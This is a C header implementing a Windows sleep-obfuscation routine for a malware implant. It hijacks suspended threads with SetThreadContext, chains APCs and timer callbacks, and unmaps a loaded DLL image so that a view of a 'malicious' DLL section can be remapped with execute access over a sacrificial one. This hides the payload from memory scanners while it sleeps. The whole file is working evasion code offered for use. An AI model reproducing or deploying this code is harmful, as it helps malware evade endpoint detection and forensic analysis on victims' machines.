#pragma once

#include <Windows.h>
#include "headers.h"

/**
 * Ensures that the specified stack address is committed and writable.
 * * This function handles cases where manual stack manipulation (e.g., thread hijacking)
 * targets an address that resides in a reserved page or a guard page, which would
 * otherwise trigger an EXCEPTION_ACCESS_VIOLATION (C0000005).
 */
BOOLEAN AllocateStack(HANDLE hProcess, ULONG_PTR target_addr) {
    MEMORY_BASIC_INFORMATION mbi;

    // Align the target address to the start of the 4KB page boundary.
    target_addr &= ~((UINT64)0xfff);

    // 1. Query the memory region containing the target address to determine its state.
    // This allows us to check if the page is already COMMITTED, RESERVED, or a GUARD page.
    if (VirtualQueryEx(hProcess, (LPCVOID)target_addr, &mbi, sizeof(mbi)) == 0) {
        return FALSE;
    }

    // 2. Evaluate if the page requires intervention.
    // Intervene if:
    // - State is MEM_RESERVE: The address space is allocated but lacks physical backing.
    // - Protect has PAGE_GUARD: This is a stack's growth boundary; writing here triggers a crash 
    //   if not handled by the OS exception handler.
    // - Access is not PAGE_READWRITE: The page exists but cannot be written to.
    if (mbi.State != MEM_COMMIT || (mbi.Protect & PAGE_GUARD) || !(mbi.Protect & PAGE_READWRITE)) {

        // Attempt to COMMIT the memory. For the thread's stack, this converts the 
        // MEM_RESERVE region (allocated during CreateThread) into accessible physical memory.
        if (!VirtualAllocEx(hProcess, (LPVOID)target_addr, 0x1000, MEM_COMMIT, PAGE_READWRITE)) {

            // If explicit commitment fails, attempt to strip protection flags (e.g., PAGE_GUARD)
            // or upgrade permissions (e.g., from PAGE_READONLY to PAGE_READWRITE).
            DWORD oldProtect;
            if (!VirtualProtectEx(hProcess, (LPVOID)target_addr, 0x1000, PAGE_READWRITE, &oldProtect)) {
                // Return FALSE if the address is truly invalid or access is denied by the OS kernel.
                return FALSE; 
            }
        }
    }

    return TRUE;
}

/*-----------------------------------------------------------*/

int Sleaping(PVOID ImageBaseDLL, HANDLE sacDllHandle, HANDLE malDllHandle, SIZE_T viewSize, PNT_FUNCTIONS ntFunctions, PVOID NtTestAlertAddress) {

    
    HANDLE DummyEvent = { 0 };
    
    //sleaping threads = 5 Timers + 6 APC threads
    HANDLE ThreadArray[4] = { NULL };

    //timers variables
    HANDLE  hTimerQueue = NULL;
    HANDLE  hNewTimer = NULL;

    //i create the sync event that would trigger the first thread 

    if (!NT_SUCCESS(ntFunctions->NtCreateEvent(&DummyEvent, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE))) {
        return -1;
    }

	
    //variables and logic for SLEAPING timers
    CONTEXT* context = (CONTEXT*)(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    CONTEXT* contextB = (CONTEXT*)(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    CONTEXT* contextC = (CONTEXT*)(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    CONTEXT* contextD = (CONTEXT*)(VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));


    if (context == NULL || contextB == NULL || contextC == NULL  || contextD == NULL) {
        return -1;
    }

    context->ContextFlags = CONTEXT_ALL;
    contextB->ContextFlags = CONTEXT_ALL;
    contextC->ContextFlags = CONTEXT_ALL;
    contextD->ContextFlags = CONTEXT_ALL;
    
    ThreadArray[2] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WaitForSingleObjectEx, NULL, CREATE_SUSPENDED, NULL);
    if (ThreadArray[2] == NULL) {

        return -1;
    }

	if (!GetThreadContext(ThreadArray[2], contextC)) {
		return -1;
	}

    *(ULONG_PTR*)((*contextC).Rsp) = (DWORD64)NtTestAlertAddress;
    (*contextC).Rip = (DWORD64)WaitForSingleObjectEx;
    (*contextC).Rcx = (DWORD64)(DummyEvent);
    (*contextC).Rdx = (DWORD64)21000;
    (*contextC).R8 = FALSE;

    if (!SetThreadContext(ThreadArray[2], contextC)) {
        return -1;
    }//wait + APCs 
    //resume the thread that is going to wait the sleep time and then execute the APCs 
    if (!ResumeThread(ThreadArray[2])) {
        return -1;
    }


    // Create a thread to control
    ThreadArray[0] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)UnmapViewOfFile, NULL, CREATE_SUSPENDED, NULL);
    if (ThreadArray[0] == NULL) {

        return -1;
    }
    ThreadArray[1] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MapViewOfFileEx, NULL, CREATE_SUSPENDED, NULL);
    if (ThreadArray[1] == NULL) {

        return -1;
    }
    ThreadArray[3] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MapViewOfFileEx, NULL, CREATE_SUSPENDED, NULL);
    if (ThreadArray[3] == NULL) {

        return -1;
    }


    if(!GetThreadContext(ThreadArray[0], context))
		return -1;
    if(!GetThreadContext(ThreadArray[1], contextB))
		return -1;
	if(!GetThreadContext(ThreadArray[3], contextD))
		return -1;

     
    //timer triggered
    *(ULONG_PTR*)((*context).Rsp) = (DWORD64)ExitThread;
    (*context).Rip = (DWORD64)UnmapViewOfFile;
    (*context).Rcx = (DWORD64)(ImageBaseDLL);

    *(ULONG_PTR*)((*contextB).Rsp) = (DWORD64)ExitThread;
    (*contextB).Rip = (DWORD64)MapViewOfFileEx;
    (*contextB).Rcx = (DWORD64)sacDllHandle;
    (*contextB).Rdx = FILE_MAP_ALL_ACCESS;
    (*contextB).R8 = (DWORD64)0x00;
    (*contextB).R9 = (DWORD64)0x00;

    /*
     * PAGE BOUNDARY CHECK (Stack Extension Fix)
     * -----------------------------------------
     * On x64, arguments 5 and 6 must be placed on the stack at RSP+40 and RSP+48.
     * If RSP is near the end of a committed page (e.g., 0x...FFF8), adding 40 bytes
     * pushes the target address into the next virtual memory page.
     *
     * Because this is a manual write via pointer dereferencing (not a 'push' instruction),
     * the CPU does not trigger the standard 'Guard Page' exception to grow the stack.
     * Instead, it hits a 'Reserved' page and triggers an EXCEPTION_ACCESS_VIOLATION.
     */
    if (((contextB->Rsp + 40) >> 12) > (contextB->Rsp >> 12) || 
        ((contextB->Rsp + 48) >> 12) > (contextB->Rsp >> 12))
    {
        // Manually commit the next page in the stack region to ensure it is writable.
        // ((HANDLE)(LONG_PTR)-1) targets the current process.
        if (AllocateStack((HANDLE)-1, contextB->Rsp + 40) == FALSE)
            return -1;
    }


    // Now safe to write stack-based arguments (Arg 5 and Arg 6)
    *(ULONG_PTR*)((*contextB).Rsp + 40) = 0x00; //the offset must be either hex 28 or int 40
    *(ULONG_PTR*)((*contextB).Rsp + 48) = (ULONG_PTR)ImageBaseDLL;

    //apc triggered 
    *(ULONG_PTR*)((*contextD).Rsp) = (DWORD64)ExitThread;
    (*contextD).Rip = (DWORD64)MapViewOfFileEx;
    (*contextD).Rcx = (DWORD64)malDllHandle;
    (*contextD).Rdx = FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE;
    (*contextD).R8 = (DWORD64)0x00;
    (*contextD).R9 = (DWORD64)0x00;

    /* * Repeat page boundary verification for thread 3 stack context.
     * This ensures the memory page spanning RSP+40 to RSP+48 is COMMITTED.
     */
    if (((contextD->Rsp + 40) >> 12) > (contextD->Rsp >> 12) || 
        ((contextD->Rsp + 48) >> 12) > (contextD->Rsp >> 12))
    {
        if (AllocateStack((HANDLE)-1, contextD->Rsp + 40) == FALSE)
            return -1;
    }

    // Write arguments to the confirmed valid memory region
    *(ULONG_PTR*)((*contextD).Rsp + 40) = 0x00; //the offset must be either hex 28 or int 40
    *(ULONG_PTR*)((*contextD).Rsp + 48) = (ULONG_PTR)ImageBaseDLL;

	if (!SetThreadContext(ThreadArray[0], context))
		return -1;
	if (!SetThreadContext(ThreadArray[1], contextB))
		return -1;
	if (!SetThreadContext(ThreadArray[3], contextD))
		return -1;

    
    //create the timer queue
    hTimerQueue = CreateTimerQueue();
    if (hTimerQueue == NULL) {
        return -1;
    }

    //queue the APC threads to the worker thread
    
    if (!NT_SUCCESS(ntFunctions->NtQueueApcThread(ThreadArray[2], (PPS_APC_ROUTINE)UnmapViewOfFile, ImageBaseDLL, FALSE, NULL))) {
            return -1;
    }
	if (!NT_SUCCESS(ntFunctions->NtQueueApcThread(ThreadArray[2], (PPS_APC_ROUTINE)ResumeThread, ThreadArray[3], FALSE, NULL))) {
		return -1;
	}

    //queueing an extra APC for exiting the main thread
    if (!NT_SUCCESS(ntFunctions->NtQueueApcThread(ThreadArray[2], (PPS_APC_ROUTINE)ExitThread, NULL, FALSE, NULL))) {
        return -1;
    }
    
	

    if (!CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)ResumeThread, ThreadArray[0], 200, 0, WT_EXECUTEINTIMERTHREAD)) {
		return -1;
	}//unmap
    
	if (!CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)ResumeThread, ThreadArray[1], 300, 0, WT_EXECUTEINTIMERTHREAD)) {
		return -1;
	}//mapex
		
    
	
	//wait for all the threads to finish
    if (WaitForMultipleObjects(4, ThreadArray, TRUE, INFINITE) == WAIT_FAILED) {
        return -1;
    }

    //good morning
	if (hNewTimer != NULL) {
		if (DeleteTimerQueueTimer(hTimerQueue, hNewTimer, NULL) == 0) {
			return -1;
		}
	}

    if (DeleteTimerQueue(hTimerQueue) == 0) {

        return -1;
    }

    //clean up totale
    if (context) VirtualFree(context, 0, MEM_RELEASE);
    if (contextB) VirtualFree(contextB, 0, MEM_RELEASE);
    if (contextC) VirtualFree(contextC, 0, MEM_RELEASE);
    if (contextD) VirtualFree(contextD, 0, MEM_RELEASE);
    if (DummyEvent) CloseHandle(DummyEvent);


    return 0;

}